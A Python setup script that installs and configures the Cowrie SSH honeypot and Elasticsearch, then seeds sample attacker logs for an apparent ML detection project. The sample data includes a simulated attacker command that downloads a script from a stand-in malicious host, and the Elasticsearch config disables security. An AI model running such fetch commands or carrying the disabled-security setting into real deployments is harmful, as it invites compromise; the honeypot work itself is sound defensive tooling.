"""
Cowrie Honeypot Setup Script
Automates the installation and configuration of Cowrie SSH honeypot
"""

import os
import subprocess
import sys
import json
import yaml
from pathlib import Path

def run_command(command, check=True):
    """Run a shell command and return the result"""
    try:
        result = subprocess.run(command, shell=True, check=check, 
                              capture_output=True, text=True)
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.CalledProcessError as e:
        return False, e.stdout, e.stderr

def install_cowrie():
    """Install Cowrie honeypot"""
    print("Installing Cowrie honeypot...")
    
    # Update system packages
    print("Updating system packages...")
    success, stdout, stderr = run_command("sudo apt update")
    if not success:
        print(f"Failed to update packages: {stderr}")
        return False
    
    # Install required packages
    packages = [
        "python3", "python3-pip", "python3-venv", "git",
        "libssl-dev", "libffi-dev", "build-essential"
    ]
    
    for package in packages:
        print(f"Installing {package}...")
        success, stdout, stderr = run_command(f"sudo apt install -y {package}")
        if not success:
            print(f"Failed to install {package}: {stderr}")
            return False
    
    # Create cowrie user
    print("Creating cowrie user...")
    run_command("sudo useradd -m -s /bin/bash cowrie", check=False)
    
    # Clone Cowrie repository
    print("Cloning Cowrie repository...")
    success, stdout, stderr = run_command("sudo -u cowrie git clone https://github.com/cowrie/cowrie.git /opt/cowrie")
    if not success:
        print(f"Failed to clone Cowrie: {stderr}")
        return False
    
    # Set up virtual environment
    print("Setting up virtual environment...")
    success, stdout, stderr = run_command("sudo -u cowrie python3 -m venv /opt/cowrie/cowrie-env")
    if not success:
        print(f"Failed to create virtual environment: {stderr}")
        return False
    
    # Install Cowrie dependencies
    print("Installing Cowrie dependencies...")
    success, stdout, stderr = run_command("sudo -u cowrie /opt/cowrie/cowrie-env/bin/pip install -r /opt/cowrie/requirements.txt")
    if not success:
        print(f"Failed to install dependencies: {stderr}")
        return False
    
    return True

def configure_cowrie():
    """Configure Cowrie for ML integration"""
    print("Configuring Cowrie...")
    
    # Create configuration directory
    os.makedirs("/opt/cowrie/etc", exist_ok=True)
    
    # Create basic Cowrie configuration
    cowrie_config = """
[cowrie]
enabled = true
listen_port = 2222
listen_address = 0.0.0.0

[output_jsonlog]
enabled = true
logfile = /var/log/cowrie/cowrie.json

[honeypot]
enabled_commands = ls,pwd,whoami,cat,cd,ps,netstat,wget,curl,ssh

[fakefiles]
enabled = true
fake_passwd = /etc/passwd
fake_shadow = /etc/shadow
"""
    
    # Write configuration
    with open("/opt/cowrie/etc/cowrie.cfg", "w") as f:
        f.write(cowrie_config)
    
    # Create log directory
    os.makedirs("/var/log/cowrie", exist_ok=True)
    run_command("sudo chown cowrie:cowrie /var/log/cowrie")
    
    # Create systemd service
    service_content = """
[Unit]
Description=Cowrie SSH Honeypot
After=network.target

[Service]
Type=simple
User=cowrie
Group=cowrie
WorkingDirectory=/opt/cowrie
ExecStart=/opt/cowrie/cowrie-env/bin/python /opt/cowrie/bin/cowrie start
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    
    with open("/tmp/cowrie.service", "w") as f:
        f.write(service_content)
    
    run_command("sudo mv /tmp/cowrie.service /etc/systemd/system/")
    run_command("sudo systemctl daemon-reload")
    run_command("sudo systemctl enable cowrie")
    
    return True

def setup_elasticsearch():
    """Setup Elasticsearch for log storage"""
    print("Setting up Elasticsearch...")
    
    # Install Java (required for Elasticsearch)
    success, stdout, stderr = run_command("sudo apt install -y openjdk-11-jdk")
    if not success:
        print(f"Failed to install Java: {stderr}")
        return False
    
    # Add Elasticsearch repository
    run_command("wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -")
    run_command('echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list')
    
    # Update and install Elasticsearch
    run_command("sudo apt update")
    success, stdout, stderr = run_command("sudo apt install -y elasticsearch")
    if not success:
        print(f"Failed to install Elasticsearch: {stderr}")
        return False
    
    # Configure Elasticsearch
    es_config = """
cluster.name: honeypot-cluster
node.name: honeypot-node
path.data: /var/lib/elasticsearch
path.logs: /var/log/elasticsearch
network.host: localhost
http.port: 9200
discovery.type: single-node
xpack.security.enabled: false
"""
    
    with open("/tmp/elasticsearch.yml", "w") as f:
        f.write(es_config)
    
    run_command("sudo mv /tmp/elasticsearch.yml /etc/elasticsearch/")
    run_command("sudo systemctl enable elasticsearch")
    run_command("sudo systemctl start elasticsearch")
    
    # Wait for Elasticsearch to start
    import time
    time.sleep(10)
    
    # Test connection
    success, stdout, stderr = run_command("curl -X GET 'localhost:9200/'")
    if success:
        print("Elasticsearch is running successfully")
        return True
    else:
        print(f"Elasticsearch test failed: {stderr}")
        return False

def create_sample_data():
    """Create sample log data for testing"""
    print("Creating sample log data...")
    
    sample_logs = [
        {
            "timestamp": "2024-01-15T10:30:00.000Z",
            "session": "session_001",
            "eventid": "cowrie.login.failed",
            "username": "admin",
            "password": "password123",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:05.000Z",
            "session": "session_001",
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "admin",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:10.000Z",
            "session": "session_001",
            "eventid": "cowrie.command.input",
            "input": "ls -la",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:15.000Z",
            "session": "session_001",
            "eventid": "cowrie.command.input",
            "input": "whoami",
            "src_ip": "192.168.1.100"
        },
        {
            "timestamp": "2024-01-15T10:30:20.000Z",
            "session": "session_001",
            "eventid": "cowrie.command.input",
            "input": "wget http://malicious.com/script.sh",
            "src_ip": "192.168.1.100"
        }
    ]
    
    # Write sample logs
    os.makedirs("/var/log/cowrie", exist_ok=True)
    with open("/var/log/cowrie/cowrie.json", "w") as f:
        for log_entry in sample_logs:
            f.write(json.dumps(log_entry) + "\n")
    
    print("Sample log data created")
    return True

def main():
    """Main setup function"""
    print("ML-Powered Honeypot Setup")
    print("=" * 40)
    
    if os.geteuid() != 0:
        print("This script must be run as root (use sudo)")
        sys.exit(1)
    
    steps = [
        ("Installing Cowrie", install_cowrie),
        ("Configuring Cowrie", configure_cowrie),
        ("Setting up Elasticsearch", setup_elasticsearch),
        ("Creating sample data", create_sample_data)
    ]
    
    for step_name, step_func in steps:
        print(f"\n{step_name}...")
        if not step_func():
            print(f"Failed: {step_name}")
            sys.exit(1)
        print(f"Success: {step_name}")
    
    print("\n" + "=" * 40)
    print("Setup completed successfully!")
    print("\nNext steps:")
    print("1. Start Cowrie: sudo systemctl start cowrie")
    print("2. Install Python dependencies: pip install -r requirements.txt")
    print("3. Run the ML honeypot: python main.py")
    print("4. Access dashboard: http://localhost:5000")

if __name__ == "__main__":
    main()
